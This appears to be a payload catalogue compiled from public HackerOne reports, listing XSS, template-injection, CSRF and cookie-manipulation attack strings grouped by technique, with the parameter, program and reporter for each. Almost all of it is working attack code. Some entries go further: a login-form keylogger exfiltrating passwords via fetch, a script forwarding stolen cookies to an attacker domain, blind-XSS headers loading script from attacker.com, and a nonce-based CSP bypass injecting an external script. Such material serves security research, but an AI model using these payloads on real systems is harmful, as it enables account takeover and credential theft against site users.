— [Reflective Cross Site Scripting (XSS) on ███████/Pages](https://hackerone.com/reports/1794757) · U.S. Dept Of Defense · [predatorsparrow](https://hackerone.com/predatorsparrow)

### `671b7e6c`

```
https://████████/Pages/default.aspx?FollowSite=0&SiteName=%27-confirm(%27XSSALERT%27
```

**Parameter:** `SiteName`
— [Reflective Cross Site Scripting (XSS) on ███████/Pages](https://hackerone.com/reports/1794757) · U.S. Dept Of Defense · [predatorsparrow](https://hackerone.com/predatorsparrow)


## Reflected XSS via sysparm_url parameter containing javascript:alert

### `7ed3ab29`

```
https://████/logout_redirect.do?sysparm_url=//j%5c%5cjavascript%3aalert(document.domain
```

**Parameter:** `sysparm_url`
— [Reflected XSS at https://██████/](https://hackerone.com/reports/1681178) · U.S. Dept Of Defense · [testingforbugs](https://hackerone.com/testingforbugs)

### `b46b406d`

```
https://█████████/logout_redirect.do?sysparm_url=//j%5c%5cjavascript%3aalert(document.domain
```

**Parameter:** `sysparm_url`
— [XSS DUE TO CVE-2022-38463 in https://████████](https://hackerone.com/reports/1681208) · U.S. Dept Of Defense · [shuvam321](https://hackerone.com/shuvam321)


## Reflected XSS via unsanitized _cc query parameter

### `51be1fcc`

```
{"enabled":true,"sid":"bbc661585c424072","url":"target.com","cf":1022963},"queryParams":{"_cc":"asdf\"}}</script><script>alert(1)</script>"},"useragent":{"ua":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/63.0.3239.84 Chrome/63.0.3239.84 Safari/537.36","browser":
```

**Parameter:** `_cc`
— [SSL-protected Reflected XSS in https://target.com/0-dfffb25d2cf6ceeb0a27.js Endpoint](https://hackerone.com/reports/300080) · Uber · [gregoryvperry](https://hackerone.com/gregoryvperry)

### `548e1214`

```
"}}</script><script>alert(1)</script>
```

**Parameter:** `_cc`
— [SSL-protected Reflected XSS in https://target.com/0-dfffb25d2cf6ceeb0a27.js Endpoint](https://hackerone.com/reports/300080) · Uber · [gregoryvperry](https://hackerone.com/gregoryvperry)


## Reflected XSS via the URL parameter c containing a meta tag and iframe with JavaScript payload (IE X-UA-Compatible bypass)

### `8bc51e07`

```
https://target.com/xss?c=%3Cmeta%20http-equiv=%22X-UA-Compatible%22%20content=%22IE=9%22%3E%3Ciframe%20src=%27https://evil.com/github-btn.html?%23%26user=yrdy%3Cscript%3Ealert(document.domain);alert(document.cookie);//%26type=follow%27%3E%3C/iframe%3E
```

**Parameter:** `c`
— [\[target.com\] DOM Based XSS github-btn.html](https://hackerone.com/reports/200826) · Algolia · [bobrov](https://hackerone.com/bobrov) · $100.0

### `bbed1002`

```
http://target.com/xss?c=%3Cmeta%20http-equiv=%22X-UA-Compatible%22%20content=%22IE=9%22%3E%3Ciframe%20src=%27http://evil.com/github-btn.html?%23%26user=yrdy%3Cscript%3Ealert(document.domain);alert(document.cookie);//%26type=follow%27%3E%3C/iframe%3E
```

**Parameter:** `c`
— [\[target.com\] DOM Based XSS nuttyapp github-btn.html](https://hackerone.com/reports/200753) · Ubiquiti Inc. · [bobrov](https://hackerone.com/bobrov)


## Server‑side template injection (SSTI) using constructor prototype to execute arbitrary JavaScript

### `ec7d25ed`

```
{{(_="".sub).call.call({}[$="constructor"].getOwnPropertyDescriptor(_.__proto__,$).value,0,"alert(1)")()}}
```

— [Stored XSS in target.com](https://hackerone.com/reports/131450) · Uber · [albinowax](https://hackerone.com/albinowax) · $7,500.0

### `e0803e81`

```
https://target.com/search/{{constructor.constructor('alert(document.domain)')()}}
```

**Parameter:** `search`
— [\[target.com\] Reflected XSS via AngularJS Template Injection](https://hackerone.com/reports/230234) · WordPress · [ysx](https://hackerone.com/ysx)


## Stored/Reflected XSS via SVG onload payload injected in hidden form field 'frm_email' used in a CSRF request

### `b6dc25af`

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://███/████████" method="POST">
      <input type="hidden" name="action" value="F█████" />
      <input type="hidden" name="token" value="████████" />
      <input type="hidden" name="frm&#95;email" value="nagli&#64;wearehackerone&#46;com&quot;&gt;&lt;svg&#47;onload&#61;alert&#40;document&#46;domain&#41;&gt;" />
      <input type="hidden" name="frm&#
```

**Parameter:** `frm_email`
— [CSRF Based XSS @ https://██████████](https://hackerone.com/reports/1147949) · U.S. Dept Of Defense · [nagli](https://hackerone.com/nagli)

### `7133c1d3`

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://█████/████████" method="POST">
      <input type="hidden" name="action" value="F███████" />
      <input type="hidden" name="token" value="███████" />
      <input type="hidden" name="frm&#95;email" value="nagli&#64;wearehackerone&#46;com&quot;&gt;&lt;svg&#47;onload&#61;alert&#40;document&#46;domain&#41;&gt;" />
      <input type="hidden" name="fr
```

**Parameter:** `frm_email`
— [CSRF Based XSS @ https://██████████](https://hackerone.com/reports/1147949) · U.S. Dept Of Defense · [nagli](https://hackerone.com/nagli)


## Stored XSS by embedding a <script>alert(1)</script> payload in the ticket summary field

### `103da412`

```
{"html":"<script>alert(document.domain)</script>"}
```

— [Stored XSS via Kroki diagram](https://hackerone.com/reports/1731349) · GitLab · [vakzz](https://hackerone.com/vakzz) · $13,950.0

### `73d19510`

````
then create a ticket in Jira with summary containing payload e.g. ```test<script>alert(1)</script>
````

**Parameter:** `summary`
— [\[atlasboard-atlassian-package\] Cross-site Scripting (XSS)](https://hackerone.com/reports/456702) · Node.js third-party modules · [ermilov](https://hackerone.com/ermilov)


## Stored XSS via injected <img> tag with onerror attribute in HTML output

### `790603d8`

```
<span class="s1">'<a href="<a href=" https:="" target.com="" gems="" "="">https://target.com/gems/</a><img src="" onerror="alert(location)">" rel="nofollow noreferrer noopener" target="_blank"&gt;&lt;img/src/onerror=alert(location)&gt;'</span>
```

— [Double linking cause XSS (but blokeced by CSP in target.com)](https://hackerone.com/reports/729341) · GitLab · [ooooooo_q](https://hackerone.com/ooooooo_q)

### `f517c33d`

```
POST /██████/edit_profile/ HTTP/1.1
Host: ████████

REQUEST HEADER HERE

-----------------------------191691572411478
Content-Disposition: form-data; name="action"

save_info
-----------------------------191691572411478
Content-Disposition: form-data; name="password[original]"

NEWPASSWORD
-----------------------------191691572411478
Content-Disposition: form-data; name="password[confirmed]"

NEWPASSWORD
-----------------------------191691572411478
Content-Disposition: form-data; name="email[ori
```

**Parameter:** `email[original]`
— [Reflected XSS - in Email Input](https://hackerone.com/reports/799839) · U.S. Dept Of Defense · [ahmd_halabi](https://hackerone.com/ahmd_halabi)


## Stored XSS by injecting HTML with onerror into note_html JSON field

### `d043126a`

```
"notes": [
        {
          "id": 1,
          "note": "interesting note here",
          "note_html": "<img src=\"test\" onerror=\"alert(document.domain)\"></img>html overwritten",
          "cached_markdown_version": 917504,
```

**Parameter:** `note_html`
— [Persistent XSS in Note objects](https://hackerone.com/reports/508184) · GitLab · [saltyyolk](https://hackerone.com/saltyyolk) · $4,500.0

### `d2195f7d`

```
<a href="accesskey=x onclick=alert(document .domain)//"></a>
```

**Parameter:** `group_name`
— [Stored XSS on byddypress Plug-in via groups name](https://hackerone.com/reports/592316) · WordPress · [yxw21](https://hackerone.com/yxw21)


## Stored XSS by injecting JavaScript code (alert) into a downloadable archive

### `6678f4ad`

```
alert(0)
```

— [XSS In target.com Due to Mime Sniffing in IE](https://hackerone.com/reports/126197) · Uber · [ddworken](https://hackerone.com/ddworken) · $750.0

### `802104e7`

```
javascript:alert(document.domain)
```

**Parameter:** `customDomain`
— [Double Stored Cross-Site scripting in the admin panel](https://hackerone.com/reports/245172) · GSA Bounty · [sp1d3rs](https://hackerone.com/sp1d3rs)


## Stored XSS via JavaScript URI in manual_post[link] form field

### `67c98c25`

```
POST /pages/175422/manual_posts/31163 HTTP/1.1
Host: target.com
<redacted>

-----------------------------15916813141840537191014403553
Content-Disposition: form-data; name="manual_post[link]"

javascript:alert(document.domain);//http://
-----------------------------15916813141840537191014403553
<redacted>
```

**Parameter:** `manual_post[link]`
— [Stored passive XSS at scheduled posts (target.com)](https://hackerone.com/reports/214581) · Shopify · [skavans](https://hackerone.com/skavans)

### `bd5c60ff`

```
javascript:alert(document.domain);
```

**Parameter:** `customDomain`
— [Double Stored Cross-Site scripting in the admin panel](https://hackerone.com/reports/245172) · GSA Bounty · [sp1d3rs](https://hackerone.com/sp1d3rs)


## Stored XSS in lesson[goals] parameter (form field)

### `91b8cb44`

```
<form action="javasc
ript:alert(document.domain)"><button>Click</button></form>
```

**Parameter:** `lesson[goals]`
— [Stored XSS in target.com via the lesson\[goals\] parameter.](https://hackerone.com/reports/300270) · Automattic · [edoverflow](https://hackerone.com/edoverflow)

### `e02deb6a`

```
<form action="javasc
ript:eval(String.fromCharCode(118,97,114,32,109,97,114,107,117,112,61,100,111,99,117,109,101,110,116,46,100,111,99,117,109,101,110,116,69,108,101,109,101,110,116,46,105,110,110,101,114,72,84,77,76,59,119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,34,104,116,116,112,115,58,47,47,114,101,113,117,101,115,116,98,46,105,110,47,115,122,54,113,104,97,115,122,63,116,101,120,116,61,34,43,101,110,99,111,100,101,85,82,73,40,109,97,114,107,117,112,41,46,1
```

**Parameter:** `lesson[goals]`
— [Stored XSS in target.com via the lesson\[goals\] parameter.](https://hackerone.com/reports/300270) · Automattic · [edoverflow](https://hackerone.com/edoverflow)


## Stored XSS via onmouseover attribute in module name

### `d507ff0f`

```
"><div onmouseover="alert('XSS');">Hello :)                                                                                                                            "><div onmouseover="alert('XSS');">Hello :)
```

**Parameter:** `module_name`
— [Stored XSS at Module Name](https://hackerone.com/reports/1126433) · Stripo Inc · [20kilograma](https://hackerone.com/20kilograma)

### `b443497d`

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="███" method="POST">
      <input type="hidden" name="FirstName" value="WkYxnTGh" />
      <input type="hidden" name="LastName" value="WkYxnTGh" />
      <input type="hidden" name="Message" value="555" />
      <input type="hidden" name="MiddleInitial" value="A" />
      <input type="hidden" name="State" value="AL" />
      <input type="hidden" name="email" value="testing&#64;example&#46;com" />
      <in
```

**Parameter:** `return_link_url`
— [Cross-Site Scripting via 'return_link_url' parameter ](https://hackerone.com/reports/3137200) · U.S. Dept Of Defense · [jonasdiasrebelo](https://hackerone.com/jonasdiasrebelo)


## Stored XSS via Rails template literal break‑out using backticks in <script> tag

### `8d7d5852`

```
<script>let a = `<%= j '`+alert`' %>`</script>
```

— [XSS due to incomplete JS escaping](https://hackerone.com/reports/474262) · Ruby on Rails · [jessecampos](https://hackerone.com/jessecampos)

### `3fdbb975`

```
<script>let a = `<%= j '${alert()}' %>`</script>
```

— [XSS due to incomplete JS escaping](https://hackerone.com/reports/474262) · Ruby on Rails · [jessecampos](https://hackerone.com/jessecampos)


## Stored XSS via unsanitized branch name rendered in email

### `678de116`

```
<script>alert(1)</script>
```

— [Persistent XSS via e-mail when creating merge requests](https://hackerone.com/reports/496973) · GitLab · [mario-areias](https://hackerone.com/mario-areias)

### `eec08019`

```
4. Create any file but choose a different target branch (something like <script>alert(1)</script>
```

— [Persistent XSS via e-mail when creating merge requests](https://hackerone.com/reports/496973) · GitLab · [mario-areias](https://hackerone.com/mario-areias)


## SVG onload attribute injection via a crafted filename causing DOM XSS

### `ca5ee70e`

```
"><svg onload=alert(3333333);
```

— [\[serve\] Stored XSS in the filename when directories listing](https://hackerone.com/reports/358641) · Node.js third-party modules · [tungpun](https://hackerone.com/tungpun)

### `c5274888`

```
SAMLResponse="><svg/onload=alert('xss')>
```

**Parameter:** `SAMLResponse`
— [███████ - XSS - CVE-2020-3580](https://hackerone.com/reports/1243650) · U.S. Dept Of Defense · [pr3r00t](https://hackerone.com/pr3r00t)


## SVG onload XSS executing eval of window.name

### `06a69864`

```
<svg onload="var req = new XMLHttpRequest(); req.open('GET', 'https://target.com/admin', false); req.setRequestHeader('Upgrade-Insecure-Requests', '1');req.setRequestHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36') ;req.send(null);var headers = req.response.toLowerCase();console.log(headers);" xmlns="http://evil.com/2000/svg" xmlns:xlink="http://evil.com/1999/xlink" version=
```

— [Stored XSS in SVG file as data: url](https://hackerone.com/reports/1276742) · Shopify · [irisrumtub](https://hackerone.com/irisrumtub) · $5,300.0

### `2d73f484`

```
<svg onload=eval(name)></svg>
```

— [XSS on target.com without user interaction and evil.com with user interaction](https://hackerone.com/reports/96229) · Vimeo · [stefanovettorazzi](https://hackerone.com/stefanovettorazzi)


## URL‑encoded <script> injection causing reflected XSS

### `0019d9a1`

```
https://███/███=%3Cscript%3Ealert(document.domain
```

— [RXSS ON https://██████████](https://hackerone.com/reports/1244145) · U.S. Dept Of Defense · [iam_a_jinchuriki](https://hackerone.com/iam_a_jinchuriki)

### `807839c3`

```
https://target.com/card.xq?id=%3C/title%3E%3Cscript%3Ealert(document.domain
```

**Parameter:** `id`
— [xss and html injection on ( https://target.com)](https://hackerone.com/reports/1810656) · U.S. Department of State · [iismailu](https://hackerone.com/iismailu)


## XSS via malformed BBCode URL attribute injection

### `a5296279`

```
[url=target.com:/onclick='alert(document.domain)'[url=]]xss[/url]
```

**Parameter:** `t`
— [Xss was found by exploiting the URL markdown on http://target.com](https://hackerone.com/reports/313250) · Valve · [kenziy](https://hackerone.com/kenziy) · $1,000.0

### `cdf30d3f`

```
http://target.com/widget/386360/?t=[url=evil.com:/onclick=%27alert(document.domain
```

**Parameter:** `t`
— [Xss was found by exploiting the URL markdown on http://target.com](https://hackerone.com/reports/313250) · Valve · [kenziy](https://hackerone.com/kenziy) · $1,000.0


## XSS via malicious branch name reflected in merge request UI

### `0b4586bc`

```
touch 1.txt
    git add 1.txt
    git commit -m "initial commit"
    git push origin master
    
    git checkout -b "<img/src='x'/onerror=alert(document.domain)>"
    touch 2.txt
    git add 2.txt
    git commit -m "add 2.txt"
    git push origin "<img/src='x'/onerror=alert(document.domain)>"
    
    git checkout master
    touch 3.txt
    git add 3.txt
    git commit -m "add 3.txt"
    git push origin master
```

**Parameter:** `branch_name`
— [Stored XSS in merge request pages](https://hackerone.com/reports/723307) · GitLab · [mike12](https://hackerone.com/mike12) · $3,500.0

### `c3bef5a5`

```
<img/src='x'/onerror=alert(document.domain)>
```

**Parameter:** `branch_name`
— [Stored XSS in merge request pages](https://hackerone.com/reports/723307) · GitLab · [mike12](https://hackerone.com/mike12) · $3,500.0


## XSS via malicious Set‑Cookie value containing script tags

### `a9e085cc`

```
Set-Cookie: yelpmainpaastacanary=asdf guvo=</script><script>alert(1)</script>; Domain=.target.com; Path=/; Secure;
```

— [target.com XSS ATO (via login keylogger, link Google account)](https://hackerone.com/reports/2010530) · Yelp · [lil_endian](https://hackerone.com/lil_endian)

### `b693a81c`

```
Set-Cookie: yelpmainpaastacanary=asdf guvo=</script><script>alert(1)</script>; Max-Age=99999999; Domain=.target.com; Path=/; Secure; SameSite=Lax
```

— [target.com XSS ATO (via login keylogger, link Google account)](https://hackerone.com/reports/2010530) · Yelp · [lil_endian](https://hackerone.com/lil_endian)


## XSS using onauxclick event handler in a <details> element to execute a prompt with document.cookie

### `4da968bd`

```
"><details onauxclick=x=prompt,x`${document.cookie}`></details>
```

— [HTML Injection @ /\[restaurant\]/order endpoint.](https://hackerone.com/reports/738810) · Eternal · [mr_edwards](https://hackerone.com/mr_edwards) · $150.0

### `bd8fbf95`

```
"><marquee+width=1000+onauxclick=confirm(document.cookie)>XSS</marquee>
```

— [HTML Injection @ /\[restaurant\]/order endpoint.](https://hackerone.com/reports/738810) · Eternal · [mr_edwards](https://hackerone.com/mr_edwards) · $150.0


## AngularJS expression injection leading to XSS (prompt)

### `bc5ee68b`

```
astNode.operator='(window.X?void0:(window.X=true,prompt(document.domain)))+';
```

— [XSS in the search bar of target.com](https://hackerone.com/reports/221893) · WordPress · [codertom](https://hackerone.com/codertom)


## AngularJS expression injection via ng-on-error attribute leading to XSS

### `aa68223f`

```
<script src="//target.com/1.8.0/angular.js"></script>
<div ng-app>
  <img
    src="/"
    ng-on-error="$event.srcElement.ownerDocument.defaultView.alert($event.srcElement.ownerDocument.domain)"
  />
</div>
```

**Parameter:** `__proto__.innerHTML`
— [Reflected XSS on target.com via Wistia embed code](https://hackerone.com/reports/986386) · HackerOne · [vakzz](https://hackerone.com/vakzz) · $500.0


## AngularJS expression injection XSS via address field

### `65d6d5ac`

```
https://target.com/messages/referrals/contacts/                                                           [[constructor.constructor('alert(1)')()]]
```

— [Stored XSS via AngularJS Injection](https://hackerone.com/reports/141463) · drchrono · [yaworsk](https://hackerone.com/yaworsk)


## AngularJS ng-on-error attribute injection leading to JavaScript execution

### `65486647`

```
<script src='https://target.com/recaptcha/about/js/main.min.js'></script>
<img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>
```

— [CSP bypass on target.com using Google script resources](https://hackerone.com/reports/2279346) · PortSwigger Web Security · [joaxcar](https://hackerone.com/joaxcar) · $1,500.0


## AngularJS ng-on-error injection to load external script bypassing nonce‑based CSP

### `5bbd0c2f`

```
<img src=x ng-on-error='
w=$event.target.ownerDocument;
a=w.defaultView.top.document.querySelector("[nonce]");
b=w.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce;
w.body.appendChild(b)
'>
```

— [CSP bypass on target.com using Google script resources](https://hackerone.com/reports/2279346) · PortSwigger Web Security · [joaxcar](https://hackerone.com/joaxcar) · $1,500.0


## AngularJS sandbox escape using crafted expression to trigger XSS (prompt)

### `b993c028`

```
{{
c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
c.$apply=$apply;c.$eval=b;op=$root.$$phase;
$root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
B=C(b,c,b);$evalAsync("
astNode=pop();astNode.type='UnaryExpression';
astNode.operator='(window.X?void0:(window.X=true,prompt(document.domain)))+';
astNode.argument={type:'Identifier',name:'foo'};
");
m1=B($$asyncQueue.pop().expression,null,$root);
m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
$ev
```

— [Stored but \[SELF\] XSS in target.com](https://hackerone.com/reports/222224) · WordPress · [codertom](https://hackerone.com/codertom)


## Attribute‑based XSS payload injecting onmouseover alert via malformed attribute

### `08f0198e`

```
" onmouseover=alert(1) "
```

— [\[http_server\] Stored XSS in the filename when directories listing](https://hackerone.com/reports/578138) · Node.js third-party modules · [lightangel1412](https://hackerone.com/lightangel1412)


## Attribute-breaking XSS using <img src=...> payload in multiple form fields

### `faf68048`

```
2. Now enter the below payload in the First name, last name, company name and title: data: "><img src="                         >/index.html?c=hemantsolo_xss" />
```

**Parameter:** `first_name`
— [Blind Stored XSS on ███████  leads to takeover admin account](https://hackerone.com/reports/1110243) · U.S. Dept Of Defense · [hemantsolo](https://hackerone.com/hemantsolo)


## Attribute injection via onerror with encoded quotes (XSS)

### `a541ac4a`

```
'onerror=%22alert%601%60%22testabcd))/
```

— [RXSS - https://████████/](https://hackerone.com/reports/872304) · U.S. Dept Of Defense · [0xelkomy](https://hackerone.com/0xelkomy)


## Attribute injection using ontouchstart event to execute JavaScript

### `12fdff19`

```
" ontouchstart="alert(document.domain)
```

— [XSS on mobile version of target.com where the button "Follow" appears](https://hackerone.com/reports/88088) · Vimeo · [stefanovettorazzi](https://hackerone.com/stefanovettorazzi)


## Attribute injection via single‑quote break‑out adding onclick XSS

### `566952d4`

```
http://target.com/admin/stats.php?entity=global&breakdown=affiliates&statsBreakdown=day%27%20onclick=alert(document.domain)%20accesskey=X%20
```

**Parameter:** `statsBreakdown`
— [Reflected XSS on /admin/stats.php](https://hackerone.com/reports/1187820) · Revive Adserver · [solov9ev](https://hackerone.com/solov9ev)


## Attribute injection XSS using onmouseover attribute in video title

### `1af6110c`

```
"onmouseover="alert(document.domain)&#x2f;
```

**Parameter:** `title`
— [XSS on target.com | "Search within these results" feature (requires user interaction)](https://hackerone.com/reports/88105) · Vimeo · [stefanovettorazzi](https://hackerone.com/stefanovettorazzi)


## Blind XSS via malicious User-Agent header

### `41f35d5d`

```
GET /accounts/login/ HTTP/1.1
Referer: 1
User-Agent: '>"></title></style></textarea></script><script/src=attacker.com/js></script>
X-Forwarded-For: 1
Host: target.com
Accept-Encoding: gzip,deflate
Accept: */*
X-OrigHost: target.com
```

**Parameter:** `User-Agent`
— [Blind XSS in Mobpub Marketplace Admin Production | Sentry via target.com (User-Agent)](https://hackerone.com/reports/275518) · X / xAI · [harisec](https://hackerone.com/harisec)


## Case‑insensitive <script> tag XSS in form field

### `01e73222`

```
1<ScRiPt>alert(9639)</ScRiPt>
```

— [Xss  - ███](https://hackerone.com/reports/2353185) · U.S. Dept Of Defense · [chor4o](https://hackerone.com/chor4o)


## Client‑side template injection (CSTI) leading to XSS via prototype constructor

### `e21e9381`

```
https://target.com/docs/deep-linking?q=wrtz{{(_="".sub).call.call({}[$="constructor"].getOwnPropertyDescriptor(_.__proto__,$).value,0,"alert(1)")()}}zzzz
```

**Parameter:** `q`
— [Reflected XSS on target.com via Angular template injection](https://hackerone.com/reports/125027) · Uber · [albinowax](https://hackerone.com/albinowax) · $3,000.0


## Cookie injection to overwrite admin session cookies

### `6c16b466`

```
document.cookie = '_secure_admin_session_id=EVIL;path=/admin/oauth';
document.cookie = '_master_udr=EVIL;path=/admin/oauth';
```

— [H1514 DOMXSS on Embedded SDK via Shopify.API.setWindowLocation abusing cookie Stuffing](https://hackerone.com/reports/422043) · Shopify · [filedescriptor](https://hackerone.com/filedescriptor)


## Cookie injection via unsanitized cookieName in document.cookie concatenation

### `683db35e`

```
ga("create", {
	"name": "pwn",
	"trackingId": "UA-44361710-4",
	"cookieName": "injectedCookie=value;"
})
// [snip]
document.cookie = "injectedCookie=value;=GA1.3.614842418.1609270420; path=/; expires=Thu, 19 Jan 2023 03:18:11 GMT; domain=target.com;"
```

**Parameter:** `cookieName`
— [\[redacted\]](https://hackerone.com/reports/1081167) · Shopify · [bored-engineer](https://hackerone.com/bored-engineer) · $1,600.0


## Cookie overflow attack by setting many oversized cookies via document.cookie

### `efa06180`

```
for (var i = 0; i < 15; i++) {document.cookie = `X${i}=${'X'.repeat(1000)}; max-age=86400; path=/cookie_bridge/retrieve`}
```

— [target.com and evil.com ATO via XSS + Cookie Bridge](https://hackerone.com/reports/2089042) · Yelp · [lil_endian](https://hackerone.com/lil_endian)


## Cookie overflow combined with postMessage redirect to hijack the victim's session

### `1c2a1ca6`

```
for (var i = 0; i < 16; i++) {document.cookie = `X${i}=${'X'.repeat(1000)}; max-age=86400; path=/cookie_bridge/retrieve`}
window.opener.postMessage({redirect:"https://target.com/cookie_bridge/store?dhl=da_DK"}, "*");
setTimeout(function() {alert("attacker can now sign in as victim by going to:" + window.opener.location.href)}, 5000);
```

— [target.com and evil.com ATO via XSS + Cookie Bridge](https://hackerone.com/reports/2089042) · Yelp · [lil_endian](https://hackerone.com/lil_endian)


## Credential exfiltration script injected via XSS (fetch to attacker domain)

### `aba05e40`

```
setTimeout(function () {
  a = document.getElementsByName('password')[0];
  b = document.getElementsByName('email')[0];
  function f() {
    fetch(`https://target.com/?a=${encodeURIComponent(a.value)}&b=${encodeURIComponent(b.value)}`);
  }
  a.form.onclick=f;
  a.onchange=f;
  b.onchange=f;
  a.oninput=f;
  b.oninput=f;
}, 1000)
```

— [target.com XSS ATO (via login keylogger, link Google account)](https://hackerone.com/reports/2010530) · Yelp · [lil_endian](https://hackerone.com/lil_endian)


## CRLF/HTML injection XSS via `siteBaseUrl` parameter using newline and `<body>` tag

### `759703b9`

```
http://target.com/%0a<body
```

**Parameter:** `siteBaseUrl`
— [Reflected XSS in target.com /searchasyoutype/v1/search?x-api-key=](https://hackerone.com/reports/213190) · Starbucks · [an0n-j](https://hackerone.com/an0n-j)


## Cross‑site scripting injection using an SVG onload attribute in the SAMLResponse parameter

### `abf7221c`

```
SAMLResponse=%22%3E%3Csvg/onload=alert(/2XUkWJ29OE88uyTbdZ3a2UmA828/)%3E
```

**Parameter:** `SAMLResponse`
— [XSS in Cisco Endpoint](https://hackerone.com/reports/2233421) · U.S. Dept Of Defense · [r00tdaddy](https://hackerone.com/r00tdaddy)


## Cross‑site scripting payload that reads cookies and sends them to an attacker‑controlled domain via XMLHttpRequest

### `3e19a74c`

```
var xhr = new XMLHttpRequest();
xhr.open('GET', "https://target.com/cookies?name=grauth");
xhr.withCredentials = true;
xhr.onload = function () {
    this.open('GET', "https://<YOUR_DOMAIN_NAME>/" + this.response);
    this.send();
};
xhr.send();
```

— [Account takeover through the combination of cookie manipulation and XSS](https://hackerone.com/reports/534450) · Superhuman (formerly Grammarly) · [k4r4koyun](https://hackerone.com/k4r4koyun)


## CSRF with hidden field containing XSS payload

### `28b43c63`

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://███████/█████████" method="POST">
      <input type="hidden" name="████████" />
      <input type="hidden" name="███" />
      <input type="hidden" name="█████████" />
      <input type="hidden" name="██████████" value="&quot;&gt;&lt;script&gt;alert&#40;document&#46;domain&#41;&lt;&#47;script&gt;" />
      <input type="submit" value="Submit reques
```

— [POST based RXSS on https://███████/ via ███ parameter](https://hackerone.com/reports/998935) · U.S. Dept Of Defense · [nagli](https://hackerone.com/nagli)


## Decoded HTML injection payload using <br> and confirm for XSS

### `7a23cbd2`

```
o<br>nfocus=confirm(1337) autofocus tabindex=1 xss
```

— [XSS on https://████/ via ███████ parameter](https://hackerone.com/reports/1251868) · U.S. Dept Of Defense · [homosec](https://hackerone.com/homosec)


## Directory‑traversal combined with JSONP callback injection (XSS) via the tags parameter

### `5a4874d9`

```
\%2e%2e\%2e%2e\%2e%2e\comments_dal\users\getGlobalLoginSettings%2ejson?callback=alert(%2fxss%2f);%2f%2f
```

**Parameter:** `tags`
— [DOM based reflected XSS in target.com/newswire/tags through cross domain ajax request](https://hackerone.com/reports/172843) · Rockstar Games · [zombiehelp54](https://hackerone.com/zombiehelp54)


## DOM‑based XSS via atb parameter injected into innerHTML

### `3ac0903e`

```
https://target.com/50x.html?e=&atb=test%22/%3E%3Cimg%20src=x%20onerror=alert(document.domain
```

**Parameter:** `atb`
— [DOM XSS on 50x.html page](https://hackerone.com/reports/405191) · DuckDuckGo · [cujanovic](https://hackerone.com/cujanovic)


## DOM‑based XSS via attribute injection in the "a" query parameter

### `3c6c260b`

```
simo%27onfocus=%27confirm(document.domain)%27name=%27simo%27#simo
```

**Parameter:** `a`
— [Reflected Xss in \[██████\]](https://hackerone.com/reports/1033253) · U.S. Dept Of Defense · [medblgsec](https://hackerone.com/medblgsec)


## DOM‑based XSS via backslash‑escaped injection in the 'x-uid' query parameter

### `77996b62`

```
1. go to:                                                                                                                                                                                                                                                                                                                                                                                                                                                   ];prompt();var%20asd=[{%27foo%27:%27bar
```

**Parameter:** `x-uid`
— [DOM based XSS in target.com/<id>/purl-corporate-standard-IT \[cfg parameter\]](https://hackerone.com/reports/968690) · Acronis · [f_m](https://hackerone.com/f_m) · $50.0


## DOM‑based XSS via hash fragment containing an encoded <img onerror=alert('xss')> payload

### `07b6ef79`

```
http://localhost:3000/#&lt;img/src/onerror=alert('xss')&gt;
```

— [\[htmr\] DOM-based XSS](https://hackerone.com/reports/753971) · Node.js third-party modules · [visat](https://hackerone.com/visat)


## DOM‑based XSS that listens for postMessage and redirects the page via location.href

### `9806bc81`

```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>yelp xss poc</title>
  <script>
    function openTarget() {
      t = document.location.hash.substring(1);
      window.target = window.open(t);
    }

    // register a postmessage listener
    window.addEventListener('message', function (e) {
      console.log(e);
      if (e.data && e.data.redirect) {
        location.href = e.data.redirect; // this is vulnerable to xss but idc
      }
    });

  </script>
</head>
<body
```

— [target.com and evil.com ATO via XSS + Cookie Bridge](https://hackerone.com/reports/2089042) · Yelp · [lil_endian](https://hackerone.com/lil_endian)


## DOM‑based XSS via an onfocus attribute that evals base64‑decoded JavaScript

### `c10d6510`

```
<html dir="ltr"><head><meta charset="utf-8"><title>Rocket.Chat.Livechat</title><meta
name="viewport" content="width=device-width,initial-scale=1"><link rel="stylesheet"
type="text/css" href="/livechat/61.chunk.a8a84.css"><script charset="utf-8"
src="/livechat/61.chunk.6a8fa.js"></script><link rel="stylesheet" type="text/css"
href="/livechat/62.chunk.e3920.css"><script charset="utf-8"
src="/livechat/62.chunk.39808.js"></script><script charset="utf-8"
src="/livechat/i18n.en.chunk.2a3c0.js"></scrip
```

— [Blind XSS](https://hackerone.com/reports/1091118) · Rocket.Chat · [abhinav-porwal](https://hackerone.com/abhinav-porwal)


## DOM‑based XSS via postMessage injection with javascript: URI

### `8c6a1dec`

```
<script>
    function attack(){
        const ctx = window.open(location.origin+'/admin/themes', '_blank')
        const json = {
            message: "Shopify.API.Modal.initialize",
            data: {
                src: ""
            }
        }

        let interval;
        interval = setInterval(function(){
            if (window.attackSuccess) {
                clearInterval(interval)
            } else {
                ctx.postMessage(JSON.stringify(json)) // data.src == ""
          
```

— [DOM XSS via Shopify.API.Modal.initialize](https://hackerone.com/reports/602767) · Shopify · [tiago-danin](https://hackerone.com/tiago-danin) · $500.0


## DOM‑based XSS via selector injection (malicious attribute in CSS selector)

### `58025ea7`

```
'div[id="\\uD83D\\uDC4D;alert(1)//"]'
```

— [WAF bypass and java script incomplete handling of Unicode characters might leads to dom-xss](https://hackerone.com/reports/2921905) · Doppler · [clubbable](https://hackerone.com/clubbable)


